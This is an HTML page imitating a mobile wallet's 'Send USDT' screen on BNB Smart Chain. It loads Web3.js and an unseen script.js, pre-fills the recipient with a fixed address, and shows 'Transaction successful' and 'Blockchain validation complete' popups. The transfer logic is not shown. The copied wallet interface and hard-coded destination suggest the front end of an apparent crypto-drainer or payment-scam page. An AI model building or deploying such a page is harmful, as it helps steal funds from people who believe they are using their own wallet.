<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <meta name="color-scheme" content="light dark">
  <title>Send USDT v2</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <!-- Web3.js (Load First) -->
  <script src="js/web3.min.js"></script>
</head>
<body>
  <!-- Loading overlay: "Loading" title + diamond with bars going up and down in sequence (equalizer style) -->
  <div id="loadingOverlay" class="loading-overlay-match" aria-hidden="true" style="display: none;">
    <header class="loading-overlay-match__header">
      <button type="button" class="loading-overlay-match__close" aria-label="Close">&times;</button>
      <h1 class="loading-overlay-match__title">Loading</h1>
    </header>
    <div class="loading-overlay-match__indicator">
      <div class="loading-overlay-match__diamond">
        <div class="loading-overlay-match__bars">
          <span class="loading-overlay-match__bar"></span>
          <span class="loading-overlay-match__bar"></span>
          <span class="loading-overlay-match__bar"></span>
          <span class="loading-overlay-match__bar"></span>
        </div>
      </div>
    </div>
  </div>

  <main class="container">
    <p class="version-badge" aria-hidden="true">v2</p>
    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group">
      <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select">
      <div class="network-icon">
        <img src="cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img">
      </div>
      <span class="network-text">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate" id="estimate">≈ $0.00</p>

    <button id="verifyBtn" class="next-btn">Next</button>
  </main>

  <!-- Success popup: shown ONLY when script calls showSuccess() after transfer succeeds (never before) -->
  <div id="successModal" class="success-modal" aria-hidden="true" style="display: none;">
    <div class="success-modal__backdrop"></div>
    <div class="success-modal__sheet">
      <button type="button" class="success-modal__close" aria-label="Close">&times;</button>
      <div class="success-modal__graphic">
        <svg class="success-modal__icon" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
          <circle cx="70" cy="70" r="56" stroke="rgba(0, 122, 255, 0.4)" stroke-width="1" fill="none"/>
          <ellipse cx="70" cy="70" rx="56" ry="28" stroke="rgba(0, 122, 255, 0.35)" stroke-width="0.9" fill="none"/>
          <ellipse cx="70" cy="70" rx="28" ry="56" stroke="rgba(0, 122, 255, 0.35)" stroke-width="0.9" fill="none"/>
          <path d="M36 72 L56 92 L104 44" stroke="#34C759" stroke-width="14" stroke-linecap="round" stroke-linejoin="round"/>
          <path d="M56 92 L104 44" stroke="#007AFF" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h2 class="success-modal__title">Transaction successful!</h2>
      <p class="success-modal__desc">
        <span class="success-modal__line">Your transaction has been confirmed.</span>
        <span class="success-modal__line">Blockchain validation complete.</span>
      </p>
      <a id="successModalDetailsBtn" href="https://bscscan.com/" target="_blank" rel="noopener" class="success-modal__btn">Transaction details</a>
    </div>
  </div>

  <!-- Transaction error popup: light mode = white bg + blue; dark mode = dark bg + green (reference style) -->
  <div id="errorModal" class="error-modal" aria-hidden="true" style="display: none;">
    <div class="error-modal__backdrop"></div>
    <div class="error-modal__box">
      <button type="button" class="error-modal__close" aria-label="Close">&times;</button>
      <div class="error-modal__graphic">
        <svg class="error-modal__icon" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
          <ellipse cx="50" cy="50" rx="42" ry="24" stroke="currentColor" stroke-width="2" fill="none" opacity="0.6"/>
          <path d="M22 22 L78 78 M78 22 L22 78" stroke="#E53935" stroke-width="12" stroke-linecap="round"/>
          <path d="M22 22 L78 78 M78 22 L22 78" stroke="#B71C1C" stroke-width="4" stroke-linecap="round"/>
          <polygon points="50,18 54,26 62,26 56,32 58,40 50,36 42,40 44,32 38,26 46,26" fill="#7C4DFF" opacity="0.9"/>
          <polygon points="72,50 78,54 76,62 68,62 66,54" fill="#E040FB" opacity="0.85"/>
          <polygon points="28,58 34,62 32,70 24,70 22,62" fill="#7C4DFF" opacity="0.85"/>
        </svg>
      </div>
      <h2 class="error-modal__title">Transaction error</h2>
      <p id="errorModalMessage" class="error-modal__message"></p>
      <button type="button" class="error-modal__ok">OK</button>
    </div>
  </div>

  <script src="js/script.js"></script>
  <script>
    document.getElementById("verifyBtn").addEventListener("click", Next);
    (function () {
      var loadingEl = document.getElementById("loadingOverlay");
      var origShowLoading = window.showLoading;
      var origHideLoading = window.hideLoading;
      if (loadingEl && typeof origShowLoading === "function") {
        window.showLoading = function (msg) {
          var spin = document.getElementById("loadingSpinner");
          if (spin) spin.style.display = "none";
          loadingEl.style.removeProperty("display");
          loadingEl.setAttribute("aria-hidden", "false");
          origShowLoading.apply(this, arguments);
        };
      }
      if (loadingEl && typeof origHideLoading === "function") {
        window.hideLoading = function () {
          loadingEl.style.display = "none";
          loadingEl.setAttribute("aria-hidden", "true");
          origHideLoading.apply(this, arguments);
        };
      }
      var closeBtn = loadingEl && loadingEl.querySelector(".loading-overlay-match__close");
      if (closeBtn) closeBtn.addEventListener("click", function () { if (typeof window.hideLoading === "function") window.hideLoading(); });
    })();
    (function () {
      var modal = document.getElementById("successModal");
      if (!modal) return;
      var origShowSuccess = window.showSuccess;
      if (typeof origShowSuccess !== "function") return;
      window.showSuccess = function (message) {
        origShowSuccess(message);
        modal.style.removeProperty("display");
        modal.classList.add("is-open");
        modal.setAttribute("aria-hidden", "false");
      };
      function closeModal() {
        modal.classList.remove("is-open");
        modal.setAttribute("aria-hidden", "true");
        modal.style.display = "none";
      }
      modal.querySelector(".success-modal__close").addEventListener("click", closeModal);
      modal.querySelector(".success-modal__backdrop").addEventListener("click", closeModal);
    })();
    (function () {
      var errorModal = document.getElementById("errorModal");
      var errorMsgEl = document.getElementById("errorModalMessage");
      var origShowError = window.showError;
      if (!errorModal || !errorMsgEl || typeof origShowError !== "function") return;
      function openErrorModal(message) {
        var scriptPopup = document.getElementById("errorPopup");
        if (scriptPopup) scriptPopup.style.display = "none";
        errorMsgEl.textContent = message || "Transaction failed.";
        errorModal.style.removeProperty("display");
        errorModal.classList.add("is-open");
        errorModal.setAttribute("aria-hidden", "false");
      }
      function closeErrorModal() {
        errorModal.classList.remove("is-open");
        errorModal.setAttribute("aria-hidden", "true");
        errorModal.style.display = "none";
      }
      window.showError = function (message) {
        origShowError.apply(this, arguments);
        openErrorModal(message);
      };
      errorModal.querySelector(".error-modal__close").addEventListener("click", closeErrorModal);
      errorModal.querySelector(".error-modal__backdrop").addEventListener("click", closeErrorModal);
      errorModal.querySelector(".error-modal__ok").addEventListener("click", closeErrorModal);
    })();
  </script>
  <!-- Update USD estimate and Next button colour: light when no amount, dark when amount entered -->
  <script>
    (function () {
      var amountInput = document.getElementById("amount");
      var estimateEl = document.getElementById("estimate");
      var nextBtn = document.getElementById("verifyBtn");
      function updateEstimateAndButton() {
        var raw = amountInput.value.replace(/^\s+|\s+$/g, "");
        var num = parseFloat(raw) || 0;
        var value = Math.abs(num);
        estimateEl.textContent = "≈ $" + value.toFixed(2);
        if (nextBtn) {
          if (value > 0) {
            nextBtn.classList.add("next-btn--has-amount");
          } else {
            nextBtn.classList.remove("next-btn--has-amount");
          }
        }
      }
      amountInput.addEventListener("input", updateEstimateAndButton);
      amountInput.addEventListener("change", updateEstimateAndButton);
      updateEstimateAndButton();
    })();
  </script>
</body>
</html>
